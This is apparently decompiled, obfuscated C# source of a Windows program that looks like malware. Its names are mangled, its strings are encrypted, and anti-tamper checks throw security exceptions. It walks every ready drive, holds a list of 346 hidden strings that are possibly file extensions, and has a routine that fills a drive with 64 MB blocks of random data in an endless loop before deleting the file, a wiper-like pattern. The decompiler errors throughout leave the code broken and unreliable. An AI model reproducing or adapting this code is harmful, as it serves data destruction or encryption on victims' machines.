using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using _0001;
using _0002;
using _0003;
using _0004;
using _0005;

namespace _0003
{
	internal sealed class _0001
	{
		internal static string _0001;

		internal static string[] _0001;

		internal static string _0002;

		internal static string _0003;

		internal static string _0004;

		internal static string _0005;

		internal static string _0006;

		static _0001()
		{
			//IL_1674: Incompatible stack heights: 0 vs 1
			//IL_1680: Incompatible stack heights: 0 vs 1
			//IL_168a: Incompatible stack heights: 0 vs 1
			//IL_1694: Incompatible stack heights: 0 vs 1
			//IL_169e: Incompatible stack heights: 0 vs 1
			//IL_16a8: Incompatible stack heights: 0 vs 1
			//IL_16b2: Incompatible stack heights: 0 vs 1
			bool flag = false;
			Assembly.GetExecutingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_167a: Stack underflow*/;
			_ = ((Assembly)/*Error near IL_168a: Stack underflow*/).CodeBase;
			global::_0003._0002._0001(107396840);
			global::_0003._0002._0001(107396835);
			((string)/*Error near IL_16a8: Stack underflow*/).Replace((string)/*Error near IL_16a8: Stack underflow*/, (string?)/*Error near IL_16a8: Stack underflow*/);
			global::_0003._0002._0001(107396862);
			string newValue = global::_0003._0002._0001(107396857);
			Uri uri = new Uri(((string)/*Error near IL_004c: Stack underflow*/).Replace((string)/*Error near IL_004c: Stack underflow*/, newValue));
			if (!global::_0001._0003._0001(uri.LocalPath, true, out flag) || !flag || !assembly.FullName!.EndsWith(global::_0003._0002._0001(107396852)))
			{
				throw new SecurityException(global::_0003._0002._0001(107396827));
			}
			global::_0003._0001._0001 = global::_0003._0002._0001(107396790);
			_0001 = new string[346]
			{
				global::_0003._0002._0001(107396200),
				global::_0003._0002._0001(107396223),
				global::_0003._0002._0001(107396214),
				global::_0003._0002._0001(107396173),
				global::_0003._0002._0001(107396164),
				global::_0003._0002._0001(107396187),
				global::_0003._0002._0001(107396178),
				global::_0003._0002._0001(107396137),
				global::_0003._0002._0001(107396128),
				global::_0003._0002._0001(107396151),
				global::_0003._0002._0001(107396110),
				global::_0003._0002._0001(107396101),
				global::_0003._0002._0001(107396124),
				global::_0003._0002._0001(107396115),
				global::_0003._0002._0001(107396586),
				global::_0003._0002._0001(107396577),
				global::_0003._0002._0001(107396600),
				global::_0003._0002._0001(107396559),
				global::_0003._0002._0001(107396550),
				global::_0003._0002._0001(107396573),
				global::_0003._0002._0001(107396564),
				global::_0003._0002._0001(107396523),
				global::_0003._0002._0001(107396514),
				global::_0003._0002._0001(107396537),
				global::_0003._0002._0001(107396528),
				global::_0003._0002._0001(107396487),
				global::_0003._0002._0001(107396482),
				global::_0003._0002._0001(107396505),
				global::_0003._0002._0001(107396500),
				global::_0003._0002._0001(107396463),
				global::_0003._0002._0001(107396454),
				global::_0003._0002._0001(107396477),
				global::_0003._0002._0001(107396468),
				global::_0003._0002._0001(107396427),
				global::_0003._0002._0001(107396418),
				global::_0003._0002._0001(107396441),
				global::_0003._0002._0001(107396432),
				global::_0003._0002._0001(107396391),
				global::_0003._0002._0001(107396414),
				global::_0003._0002._0001(107396405),
				global::_0003._0002._0001(107396364),
				global::_0003._0002._0001(107396355),
				global::_0003._0002._0001(107396378),
				global::_0003._0002._0001(107396369),
				global::_0003._0002._0001(107395816),
				global::_0003._0002._0001(107395839),
				global::_0003._0002._0001(107395830),
				global::_0003._0002._0001(107395789),
				global::_0003._0002._0001(107395780),
				global::_0003._0002._0001(107395803),
				global::_0003._0002._0001(107395794),
				global::_0003._0002._0001(107395753),
				global::_0003._0002._0001(107395744),
				global::_0003._0002._0001(107395767),
				global::_0003._0002._0001(107395762),
				global::_0003._0002._0001(107395721),
				global::_0003._0002._0001(107395712),
				global::_0003._0002._0001(107395735),
				global::_0003._0002._0001(107395694),
				global::_0003._0002._0001(107395685),
				global::_0003._0002._0001(107395708),
				global::_0003._0002._0001(107395699),
				global::_0003._0002._0001(107395658),
				global::_0003._0002._0001(107395653),
				global::_0003._0002._0001(107395676),
				global::_0003._0002._0001(107395667),
				global::_0003._0002._0001(107395626),
				global::_0003._0002._0001(107395617),
				global::_0003._0002._0001(107395640),
				global::_0003._0002._0001(107395599),
				global::_0003._0002._0001(107395590),
				global::_0003._0002._0001(107395613),
				global::_0003._0002._0001(107395604),
				global::_0003._0002._0001(107396075),
				global::_0003._0002._0001(107396066),
				global::_0003._0002._0001(107396093),
				global::_0003._0002._0001(107396084),
				global::_0003._0002._0001(107396047),
				global::_0003._0002._0001(107396038),
				global::_0003._0002._0001(107396061),
				global::_0003._0002._0001(107396052),
				global::_0003._0002._0001(107396011),
				global::_0003._0002._0001(107396002),
				global::_0003._0002._0001(107396025),
				global::_0003._0002._0001(107396016),
				global::_0003._0002._0001(107395975),
				global::_0003._0002._0001(107395994),
				global::_0003._0002._0001(107395949),
				global::_0003._0002._0001(107395940),
				global::_0003._0002._0001(107395963),
				global::_0003._0002._0001(107395954),
				global::_0003._0002._0001(107395913),
				global::_0003._0002._0001(107395904),
				global::_0003._0002._0001(107395927),
				global::_0003._0002._0001(107395886),
				global::_0003._0002._0001(107395877),
				global::_0003._0002._0001(107395900),
				global::_0003._0002._0001(107395895),
				global::_0003._0002._0001(107395854),
				global::_0003._0002._0001(107395845),
				global::_0003._0002._0001(107395868),
				global::_0003._0002._0001(107395859),
				global::_0003._0002._0001(107395306),
				global::_0003._0002._0001(107395297),
				global::_0003._0002._0001(107395320),
				global::_0003._0002._0001(107395279),
				global::_0003._0002._0001(107395270),
				global::_0003._0002._0001(107395293),
				global::_0003._0002._0001(107395284),
				global::_0003._0002._0001(107395243),
				global::_0003._0002._0001(107395234),
				global::_0003._0002._0001(107395257),
				global::_0003._0002._0001(107395248),
				global::_0003._0002._0001(107395207),
				global::_0003._0002._0001(107395230),
				global::_0003._0002._0001(107395221),
				global::_0003._0002._0001(107395180),
				global::_0003._0002._0001(107395171),
				global::_0003._0002._0001(107395194),
				global::_0003._0002._0001(107395185),
				global::_0003._0002._0001(107395144),
				global::_0003._0002._0001(107395167),
				global::_0003._0002._0001(107395158),
				global::_0003._0002._0001(107395117),
				global::_0003._0002._0001(107395108),
				global::_0003._0002._0001(107395131),
				global::_0003._0002._0001(107395122),
				global::_0003._0002._0001(107395085),
				global::_0003._0002._0001(107395076),
				global::_0003._0002._0001(107395099),
				global::_0003._0002._0001(107395562),
				global::_0003._0002._0001(107395553),
				global::_0003._0002._0001(107395576),
				global::_0003._0002._0001(107395535),
				global::_0003._0002._0001(107395526),
				global::_0003._0002._0001(107395549),
				global::_0003._0002._0001(107395540),
				global::_0003._0002._0001(107395499),
				global::_0003._0002._0001(107395490),
				global::_0003._0002._0001(107395513),
				global::_0003._0002._0001(107395468),
				global::_0003._0002._0001(107395459),
				global::_0003._0002._0001(107395482),
				global::_0003._0002._0001(107395473),
				global::_0003._0002._0001(107395432),
				global::_0003._0002._0001(107395455),
				global::_0003._0002._0001(107395446),
				global::_0003._0002._0001(107395405),
				global::_0003._0002._0001(107395396),
				global::_0003._0002._0001(107395419),
				global::_0003._0002._0001(107395410),
				global::_0003._0002._0001(107395369),
				global::_0003._0002._0001(107395360),
				global::_0003._0002._0001(107395383),
				global::_0003._0002._0001(107395342),
				global::_0003._0002._0001(107395333),
				global::_0003._0002._0001(107395356),
				global::_0003._0002._0001(107394799),
				global::_0003._0002._0001(107394790),
				global::_0003._0002._0001(107394813),
				global::_0003._0002._0001(107394804),
				global::_0003._0002._0001(107394763),
				global::_0003._0002._0001(107394754),
				global::_0003._0002._0001(107394781),
				global::_0003._0002._0001(107394772),
				global::_0003._0002._0001(107394731),
				global::_0003._0002._0001(107394722),
				global::_0003._0002._0001(107394745),
				global::_0003._0002._0001(107394736),
				global::_0003._0002._0001(107394695),
				global::_0003._0002._0001(107394718),
				global::_0003._0002._0001(107394709),
				global::_0003._0002._0001(107394668),
				global::_0003._0002._0001(107394659),
				global::_0003._0002._0001(107394686),
				global::_0003._0002._0001(107394677),
				global::_0003._0002._0001(107394636),
				global::_0003._0002._0001(107394627),
				global::_0003._0002._0001(107394650),
				global::_0003._0002._0001(107394641),
				global::_0003._0002._0001(107394600),
				global::_0003._0002._0001(107394623),
				global::_0003._0002._0001(107394614),
				global::_0003._0002._0001(107394569),
				global::_0003._0002._0001(107394560),
				global::_0003._0002._0001(107394583),
				global::_0003._0002._0001(107395054),
				global::_0003._0002._0001(107395045),
				global::_0003._0002._0001(107395068),
				global::_0003._0002._0001(107395059),
				global::_0003._0002._0001(107395018),
				global::_0003._0002._0001(107395009),
				global::_0003._0002._0001(107395032),
				global::_0003._0002._0001(107395027),
				global::_0003._0002._0001(107394986),
				global::_0003._0002._0001(107394977),
				global::_0003._0002._0001(107395000),
				global::_0003._0002._0001(107394959),
				global::_0003._0002._0001(107394950),
				global::_0003._0002._0001(107394973),
				global::_0003._0002._0001(107394924),
				global::_0003._0002._0001(107394915),
				global::_0003._0002._0001(107394938),
				global::_0003._0002._0001(107394929),
				global::_0003._0002._0001(107394888),
				global::_0003._0002._0001(107394911),
				global::_0003._0002._0001(107394906),
				global::_0003._0002._0001(107394897),
				global::_0003._0002._0001(107394856),
				global::_0003._0002._0001(107394879),
				global::_0003._0002._0001(107394870),
				global::_0003._0002._0001(107394829),
				global::_0003._0002._0001(107394820),
				global::_0003._0002._0001(107394843),
				global::_0003._0002._0001(107394834),
				global::_0003._0002._0001(107394281),
				global::_0003._0002._0001(107394272),
				global::_0003._0002._0001(107394295),
				global::_0003._0002._0001(107394254),
				global::_0003._0002._0001(107394245),
				global::_0003._0002._0001(107394268),
				global::_0003._0002._0001(107394259),
				global::_0003._0002._0001(107394218),
				global::_0003._0002._0001(107394209),
				global::_0003._0002._0001(107394232),
				global::_0003._0002._0001(107394191),
				global::_0003._0002._0001(107394182),
				global::_0003._0002._0001(107394205),
				global::_0003._0002._0001(107394196),
				global::_0003._0002._0001(107394155),
				global::_0003._0002._0001(107394146),
				global::_0003._0002._0001(107394169),
				global::_0003._0002._0001(107394160),
				global::_0003._0002._0001(107394119),
				global::_0003._0002._0001(107394142),
				global::_0003._0002._0001(107394133),
				global::_0003._0002._0001(107394092),
				global::_0003._0002._0001(107394083),
				global::_0003._0002._0001(107394106),
				global::_0003._0002._0001(107394097),
				global::_0003._0002._0001(107394056),
				global::_0003._0002._0001(107394079),
				global::_0003._0002._0001(107394070),
				global::_0003._0002._0001(107394541),
				global::_0003._0002._0001(107394532),
				global::_0003._0002._0001(107394555),
				global::_0003._0002._0001(107394546),
				global::_0003._0002._0001(107394505),
				global::_0003._0002._0001(107394496),
				global::_0003._0002._0001(107394519),
				global::_0003._0002._0001(107394478),
				global::_0003._0002._0001(107394469),
				global::_0003._0002._0001(107394492),
				global::_0003._0002._0001(107394487),
				global::_0003._0002._0001(107394446),
				global::_0003._0002._0001(107394437),
				global::_0003._0002._0001(107394460),
				global::_0003._0002._0001(107394451),
				global::_0003._0002._0001(107394410),
				global::_0003._0002._0001(107394401),
				global::_0003._0002._0001(107394424),
				global::_0003._0002._0001(107394383),
				global::_0003._0002._0001(107394374),
				global::_0003._0002._0001(107394397),
				global::_0003._0002._0001(107394392),
				global::_0003._0002._0001(107394347),
				global::_0003._0002._0001(107394338),
				global::_0003._0002._0001(107394357),
				global::_0003._0002._0001(107394316),
				global::_0003._0002._0001(107394311),
				global::_0003._0002._0001(107394334),
				global::_0003._0002._0001(107394325),
				global::_0003._0002._0001(107393772),
				global::_0003._0002._0001(107393763),
				global::_0003._0002._0001(107393786),
				global::_0003._0002._0001(107393777),
				global::_0003._0002._0001(107393736),
				global::_0003._0002._0001(107393759),
				global::_0003._0002._0001(107393750),
				global::_0003._0002._0001(107393709),
				global::_0003._0002._0001(107393700),
				global::_0003._0002._0001(107393723),
				global::_0003._0002._0001(107393718),
				global::_0003._0002._0001(107393677),
				global::_0003._0002._0001(107393668),
				global::_0003._0002._0001(107393691),
				global::_0003._0002._0001(107393682),
				global::_0003._0002._0001(107393637),
				global::_0003._0002._0001(107393660),
				global::_0003._0002._0001(107393651),
				global::_0003._0002._0001(107393610),
				global::_0003._0002._0001(107393601),
				global::_0003._0002._0001(107393624),
				global::_0003._0002._0001(107393583),
				global::_0003._0002._0001(107393574),
				global::_0003._0002._0001(107393593),
				global::_0003._0002._0001(107393548),
				global::_0003._0002._0001(107393567),
				global::_0003._0002._0001(107393558),
				global::_0003._0002._0001(107394029),
				global::_0003._0002._0001(107394020),
				global::_0003._0002._0001(107394043),
				global::_0003._0002._0001(107394034),
				global::_0003._0002._0001(107393993),
				global::_0003._0002._0001(107393984),
				global::_0003._0002._0001(107394007),
				global::_0003._0002._0001(107393966),
				global::_0003._0002._0001(107393957),
				global::_0003._0002._0001(107393980),
				global::_0003._0002._0001(107393971),
				global::_0003._0002._0001(107393930),
				global::_0003._0002._0001(107393921),
				global::_0003._0002._0001(107393944),
				global::_0003._0002._0001(107393903),
				global::_0003._0002._0001(107393894),
				global::_0003._0002._0001(107393917),
				global::_0003._0002._0001(107393917),
				global::_0003._0002._0001(107393908),
				global::_0003._0002._0001(107393867),
				global::_0003._0002._0001(107393858),
				global::_0003._0002._0001(107393881),
				global::_0003._0002._0001(107393872),
				global::_0003._0002._0001(107393831),
				global::_0003._0002._0001(107393854),
				global::_0003._0002._0001(107393845),
				global::_0003._0002._0001(107393800),
				global::_0003._0002._0001(107393823),
				global::_0003._0002._0001(107393814),
				global::_0003._0002._0001(107393261),
				global::_0003._0002._0001(107393252),
				global::_0003._0002._0001(107393275),
				global::_0003._0002._0001(107393266),
				global::_0003._0002._0001(107393225),
				global::_0003._0002._0001(107393216),
				global::_0003._0002._0001(107393239),
				global::_0003._0002._0001(107393198),
				global::_0003._0002._0001(107393189),
				global::_0003._0002._0001(107393212),
				global::_0003._0002._0001(107393203),
				global::_0003._0002._0001(107393162),
				global::_0003._0002._0001(107393153),
				global::_0003._0002._0001(107393176),
				global::_0003._0002._0001(107393135),
				global::_0003._0002._0001(107393126),
				global::_0003._0002._0001(107393149),
				global::_0003._0002._0001(107393136)
			};
			_0002 = global::_0003._0002._0001(107393095);
			_0003 = global::_0003._0002._0001(107393078);
			_0004 = global::_0003._0002._0001(107389340);
			_0005 = global::_0003._0002._0001(107389331);
			_0006 = global::_0003._0002._0001(107389250);
		}
	}
}
namespace _0005
{
	internal enum _0001
	{
		_0001,
		_0002
	}
}
namespace _0004
{
	internal sealed class _0001
	{
	}
	internal sealed class _0002
	{
		static _0002()
		{
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 1
			bool flag = false;
			Assembly.GetExecutingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_00a6: Stack underflow*/;
			_ = ((Assembly)/*Error near IL_00b6: Stack underflow*/).CodeBase;
			global::_0003._0002._0001(107396840);
			global::_0003._0002._0001(107396835);
			((string)/*Error near IL_00d4: Stack underflow*/).Replace((string)/*Error near IL_00d4: Stack underflow*/, (string?)/*Error near IL_00d4: Stack underflow*/);
			global::_0003._0002._0001(107396862);
			string newValue = global::_0003._0002._0001(107396857);
			Uri uri = new Uri(((string)/*Error near IL_004c: Stack underflow*/).Replace((string)/*Error near IL_004c: Stack underflow*/, newValue));
			bool num = global::_0001._0003._0001(uri.LocalPath, true, out flag);
			while (num)
			{
				num = flag;
				if (8u != 0 && 0 == 0)
				{
					if (!num || !assembly.FullName!.EndsWith(global::_0003._0002._0001(107396852)))
					{
						break;
					}
					return;
				}
			}
			throw new SecurityException(global::_0003._0002._0001(107396827));
		}
	}
}
namespace _0001
{
	internal sealed class _0001
	{
		public unsafe static void _0001(DriveInfo P_0)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f2: Incompatible stack heights: 0 vs 1
			//IL_00f8: Incompatible stack heights: 0 vs 1
			//IL_0102: Incompatible stack heights: 0 vs 2
			//IL_0112: Incompatible stack heights: 0 vs 1
			//IL_011e: Incompatible stack heights: 0 vs 1
			//IL_0124: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[20];
			*(long*)(nint)/*Error near IL_0012: Stack underflow*/ = 0L;
			_ = /*Error near IL_0019: Stack underflow*/+ 8;
			_ = Environment.TickCount;
			long num = (long)/*Error near IL_001f: Stack underflow*/;
			*(long*)(nint)/*Error near IL_0020: Stack underflow*/ = num;
			byte[] array = new byte[67108864];
			byte[] array2 = default(byte[]);
			if (0 == 0)
			{
				array2 = array;
			}
			new Random();
			Random random = (Random)/*Error near IL_0118: Stack underflow*/;
			*(int*)(nint)(/*Error near IL_0043: Stack underflow*/ + 16) = 0;
			string path;
			while (true)
			{
				path = Path.Combine(((DriveInfo)/*Error near IL_004f: Stack underflow*/).Name, global::_0003._0002._0001(107389225) + *(int*)((byte*)ptr + 16) + global::_0003._0002._0001(107395839));
				if (!File.Exists(path))
				{
					break;
				}
				(*(int*)((byte*)ptr + 16))++;
			}
			try
			{
				using FileStream fileStream = new FileStream(path, FileMode.CreateNew, FileAccess.Write);
				while (true)
				{
					random.NextBytes(array2);
					fileStream.Write(array2, 0, array2.Length);
					*(long*)ptr += array2.Length;
					if (Environment.TickCount - *(long*)((byte*)ptr + 8) > 1)
					{
						*(long*)((byte*)ptr + 8) = Environment.TickCount;
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				File.Delete(path);
			}
			catch (Exception)
			{
			}
		}
	}
}
namespace _0004
{
	internal sealed class _0003
	{
		internal static string[] _0001;

		static _0003()
		{
			//IL_0161: Incompatible stack heights: 0 vs 1
			//IL_016d: Incompatible stack heights: 0 vs 1
			//IL_0177: Incompatible stack heights: 0 vs 1
			//IL_0181: Incompatible stack heights: 0 vs 1
			//IL_018b: Incompatible stack heights: 0 vs 1
			//IL_0195: Incompatible stack heights: 0 vs 1
			//IL_019f: Incompatible stack heights: 0 vs 1
			bool flag = false;
			Assembly.GetExecutingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_0167: Stack underflow*/;
			_ = ((Assembly)/*Error near IL_0177: Stack underflow*/).CodeBase;
			global::_0003._0002._0001(107396840);
			global::_0003._0002._0001(107396835);
			((string)/*Error near IL_0195: Stack underflow*/).Replace((string)/*Error near IL_0195: Stack underflow*/, (string?)/*Error near IL_0195: Stack underflow*/);
			global::_0003._0002._0001(107396862);
			string newValue = global::_0003._0002._0001(107396857);
			Uri uri = new Uri(((string)/*Error near IL_004c: Stack underflow*/).Replace((string)/*Error near IL_004c: Stack underflow*/, newValue));
			if (!global::_0001._0003._0001(uri.LocalPath, true, out flag) || !flag || !assembly.FullName!.EndsWith(global::_0003._0002._0001(107396852)))
			{
				throw new SecurityException(global::_0003._0002._0001(107396827));
			}
			_0001 = new string[14]
			{
				global::_0003._0002._0001(107389216),
				global::_0003._0002._0001(107389239),
				global::_0003._0002._0001(107389198),
				global::_0003._0002._0001(107389189),
				global::_0003._0002._0001(107389212),
				global::_0003._0002._0001(107389207),
				global::_0003._0002._0001(107388650),
				global::_0003._0002._0001(107388641),
				global::_0003._0002._0001(107388660),
				global::_0003._0002._0001(107388619),
				global::_0003._0002._0001(107388610),
				global::_0003._0002._0001(107388637),
				global::_0003._0002._0001(107388632),
				global::_0003._0002._0001(107388591)
			};
		}
	}
	internal sealed class _0004
	{
		static _0004()
		{
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 1
			bool flag = false;
			Assembly.GetExecutingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_00a6: Stack underflow*/;
			_ = ((Assembly)/*Error near IL_00b6: Stack underflow*/).CodeBase;
			global::_0003._0002._0001(107396840);
			global::_0003._0002._0001(107396835);
			((string)/*Error near IL_00d4: Stack underflow*/).Replace((string)/*Error near IL_00d4: Stack underflow*/, (string?)/*Error near IL_00d4: Stack underflow*/);
			global::_0003._0002._0001(107396862);
			string newValue = global::_0003._0002._0001(107396857);
			Uri uri = new Uri(((string)/*Error near IL_004c: Stack underflow*/).Replace((string)/*Error near IL_004c: Stack underflow*/, newValue));
			bool num = global::_0001._0003._0001(uri.LocalPath, true, out flag);
			while (num)
			{
				num = flag;
				if (8u != 0 && 0 == 0)
				{
					if (!num || !assembly.FullName!.EndsWith(global::_0003._0002._0001(107396852)))
					{
						break;
					}
					return;
				}
			}
			throw new SecurityException(global::_0003._0002._0001(107396827));
		}
	}
}
namespace _0002
{
	internal sealed class _0001
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public FileInfo _0001;

			internal bool _0001(string P_0)
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 1
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_0032: Incompatible stack heights: 0 vs 1
				_ = ((_0001)/*Error near IL_0009: Stack underflow*/)._0001.FullName;
				Path.GetExtension((string?)/*Error near IL_0024: Stack underflow*/);
				((string)/*Error near IL_002b: Stack underflow*/).ToLower();
				_ = (string?)/*Error near IL_0032: Stack underflow*/ == (string?)/*Error near IL_0032: Stack underflow*/;
				return (byte)/*Error near IL_0012: Stack underflow*/ != 0;
			}
		}

		static _0001()
		{
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 1
			bool flag = false;
			Assembly.GetExecutingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_00a6: Stack underflow*/;
			_ = ((Assembly)/*Error near IL_00b6: Stack underflow*/).CodeBase;
			_0003._0002._0001(107396840);
			_0003._0002._0001(107396835);
			((string)/*Error near IL_00d4: Stack underflow*/).Replace((string)/*Error near IL_00d4: Stack underflow*/, (string?)/*Error near IL_00d4: Stack underflow*/);
			_0003._0002._0001(107396862);
			string newValue = _0003._0002._0001(107396857);
			Uri uri = new Uri(((string)/*Error near IL_004c: Stack underflow*/).Replace((string)/*Error near IL_004c: Stack underflow*/, newValue));
			bool num = global::_0001._0003._0001(uri.LocalPath, true, out flag);
			while (num)
			{
				num = flag;
				if (8u != 0 && 0 == 0)
				{
					if (!num || !assembly.FullName!.EndsWith(_0003._0002._0001(107396852)))
					{
						break;
					}
					return;
				}
			}
			throw new SecurityException(_0003._0002._0001(107396827));
		}
	}
}
namespace _0001
{
	internal static class _0002
	{
		internal static byte[] _0001;

		[STAThread]
		internal static void _0001()
		{
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			//IL_00ce: Incompatible stack heights: 0 vs 1
			while (true)
			{
				IL_0000:
				global::_0003._0002._0001(107388582);
				File.Exists((string?)/*Error near IL_00a2: Stack underflow*/);
				int num;
				int num2;
				if ((int)/*Error near IL_0011: Stack underflow*/ == 0)
				{
					DriveInfo[] drives = DriveInfo.GetDrives();
					num = 0;
					while (0 == 0)
					{
						if (num >= drives.Length)
						{
							return;
						}
						DriveInfo driveInfo = drives[num];
						if (false)
						{
							goto IL_0000;
						}
						num2 = (driveInfo.IsReady ? 1 : 0);
						if (false)
						{
							goto IL_00a7;
						}
						if (true)
						{
							if (num2 != 0)
							{
								_0003._0001(driveInfo.Name, _0002._0001);
							}
							num++;
							continue;
						}
						goto IL_004a;
					}
				}
				num2 = 107388582;
				goto IL_00a7;
				IL_0049:
				num2 = num;
				goto IL_004a;
				IL_004a:
				string[] array;
				do
				{
					if (uint.MaxValue != 0)
					{
						if (num2 >= array.Length)
						{
							return;
						}
						_0003._0001((string)((object[])/*Error near IL_0038: Stack underflow*/)[/*Error near IL_0038: Stack underflow*/], _0002._0001);
						num2 = num;
					}
					num2++;
				}
				while (false);
				num = num2;
				goto IL_0049;
				IL_00a7:
				global::_0003._0002._0001(num2);
				File.ReadAllLines((string)/*Error near IL_00b6: Stack underflow*/);
				array = (string[])/*Error near IL_00bc: Stack underflow*/;
				num = 0;
				goto IL_0049;
			}
		}
	}
}
namespace _0003
{
	internal sealed class _0002
	{
		private static readonly string m__0001;

		private static readonly string m__0002;

		internal static readonly byte[] _0001;

		internal static readonly Dictionary<int, string> _0001;

		internal static readonly object _0001;

		internal static readonly bool _0001;

		private static readonly int m__0001;

		public static string _0001(int P_0)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0036: Expected I4, but got Unknown
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003d: Expected I4, but got Unknown
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			if (8u != 0)
			{
				int num = 107396847;
				do
				{
					if (num != 0)
					{
						P_0 = /*Error near IL_000e: Stack underflow*/^ num;
						num = global::_0003._0002.m__0001;
					}
				}
				while (false);
				P_0 = /*Error near IL_001b: Stack underflow*/- num;
				_ = global::_0003._0002._0001;
			}
			if ((int)/*Error near IL_0024: Stack underflow*/ == 0 && 0 == 0)
			{
				global::_0001._0003._0001((int)/*Error near IL_0047: Stack underflow*/);
				return (string)/*Error near IL_002c: Stack underflow*/;
			}
			global::_0001._0003._0001((int)/*Error near IL_0051: Stack underflow*/);
			return (string)/*Error near IL_0031: Stack underflow*/;
		}

		static _0002()
		{
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 1
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f2: Incompatible stack heights: 0 vs 1
			//IL_00fc: Incompatible stack heights: 0 vs 1
			while (true)
			{
				if (3u != 0)
				{
					global::_0003._0002.m__0001 = "1";
					m__0002 = "7";
					global::_0003._0002._0001 = null;
				}
				new object();
				global::_0003._0002._0001 = (object)/*Error near IL_0027: Stack underflow*/;
				global::_0003._0002._0001 = false;
				global::_0003._0002.m__0001 = 0;
				while (0 == 0)
				{
					_ = global::_0003._0002.m__0001 == "1";
					if ((int)/*Error near IL_0047: Stack underflow*/ != 0)
					{
						global::_0003._0002._0001 = true;
						new Dictionary<int, string>();
						global::_0003._0002._0001 = (Dictionary<int, string>)/*Error near IL_0057: Stack underflow*/;
					}
					Convert.ToInt32(m__0002);
					global::_0003._0002.m__0001 = (int)/*Error near IL_0066: Stack underflow*/;
					if (false)
					{
						continue;
					}
					Assembly.GetExecutingAssembly();
					((Assembly)/*Error near IL_00fc: Stack underflow*/).GetManifestResourceStream("{4934b6a4-3623-4aa0-8cd8-2862216c1af6}");
					Stream stream = (Stream)/*Error near IL_0102: Stack underflow*/;
					try
					{
						int num;
						byte[] array;
						if (6u != 0)
						{
							_ = ((Stream)/*Error near IL_00b5: Stack underflow*/).Length;
							num = Convert.ToInt32((long)/*Error near IL_0089: Stack underflow*/);
							if (false)
							{
								goto IL_00a9;
							}
							array = new byte[num];
						}
						stream.Read(array, 0, num);
						global::_0003._0002._0001 = global::_0001._0003._0001(array);
						goto IL_00a9;
						IL_00a9:
						array = null;
						return;
					}
					finally
					{
						if (false || stream != null)
						{
							((IDisposable)stream).Dispose();
						}
					}
				}
			}
		}
	}
	internal sealed class _0003 : Attribute
	{
	}
}
namespace _0005
{
	internal sealed class _0002 : Attribute
	{
	}
}
namespace _0004
{
	internal static class _0005
	{
		internal sealed class _0001
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal static readonly int[] _0003;

			internal static readonly int[] _0004;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal int _0004;

			internal int _0005;

			internal bool _0001;

			internal _0002 _0001;

			internal _0003 _0001;

			internal _0005 _0001;

			internal _0004 _0001;

			internal _0004 _0002;

			public _0001(byte[] P_0)
			{
				this._0001 = new _0002();
				this._0001 = new _0003();
				this._0001 = 2;
				global::_0001._0003._0001(0, P_0.Length, this._0001, P_0);
			}

			static _0001()
			{
				//IL_0065: Incompatible stack heights: 0 vs 1
				//IL_006c: Incompatible stack heights: 0 vs 1
				//IL_0073: Incompatible stack heights: 0 vs 1
				//IL_007a: Incompatible stack heights: 0 vs 1
				while (true)
				{
					int num = 29;
					while (true)
					{
						RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
						global::_0004._0005._0001._0001 = (int[])/*Error near IL_0014: Stack underflow*/;
						while (0 == 0)
						{
							_ = new int[29]
							{
